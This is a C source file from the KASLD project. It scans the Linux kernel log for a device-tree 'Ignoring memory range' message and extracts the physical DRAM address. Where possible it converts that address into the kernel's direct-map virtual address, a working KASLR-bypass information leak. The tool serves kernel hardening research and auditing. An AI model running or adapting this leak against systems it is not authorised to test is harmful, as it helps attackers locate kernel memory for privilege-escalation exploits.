// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Flattened Device Tree (FDT) driver prints "Ignoring memory range" error if
// the requested memblock range is higher than max physical memory or smaller
// than __virt_to_phys(PAGE_OFFSET).
//
// For example, early_init_dt_add_memory_arch(0x80000000, 0x80000) on a system
// with DRAM start of 0x80200000 will print:
//
// [    0.000000] OF: fdt: Ignoring memory range 0x80000000 - 0x80200000
//
// On RISCV64 this may occur as the first 2MB are reserved for OpenSBI.
//
// On systems with a known phys->virt offset mapping, this may be used to
// identify the kernel virtual address region used for direct mapping.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v6.1.1/source/drivers/of/fdt.c#L1251
// https://patchwork.kernel.org/project/linux-riscv/patch/20211123015717.542631-2-guoren@kernel.org/#24615539
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int on_match(const char *line, void *ctx) {
  unsigned long *result = ctx;

  /* OF: fdt: Ignoring memory range 0x80000000 - 0x80200000 */
  const char *p = strstr(line, " - ");
  if (!p)
    return 1;

  char *endptr;
  unsigned long addr = strtoul(p + 2, &endptr, 16);

  if (addr >= KERNEL_VAS_END)
    return 1;

  if (addr) {
    printf("leaked DRAM physical address: 0x%016lx\n", addr);
    *result = addr;
    return 0;
  }
  return 1;
}

int main(void) {
  unsigned long addr = 0;

  printf(
      "[.] searching dmesg for early_init_dt_add_memory_arch() ignored memory "
      "ranges ...\n");
  int ds = dmesg_search("OF: fdt: Ignoring memory range 0x", on_match, &addr);

  if (!addr) {
    if (ds < 0)
      return KASLD_EXIT_NOPERM;
    printf("[-] early_init_dt_add_memory_arch info not found in dmesg\n");
    return 0;
  }

  printf("possible PAGE_OFFSET physical address: 0x%016lx\n", addr);
  kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_DRAM, addr,
               "dmesg_early_init_dt_add_memory_arch:dram");

#if !PHYS_VIRT_DECOUPLED
  unsigned long virt = phys_to_virt(addr);
  printf("possible direct-map virtual address: 0x%016lx\n", virt);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, virt,
               "dmesg_early_init_dt_add_memory_arch:directmap");
#else
  printf("note: phys and virt KASLR are decoupled on this arch; "
         "cannot derive kernel text virtual address from physical leak\n");
#endif

  return 0;
}
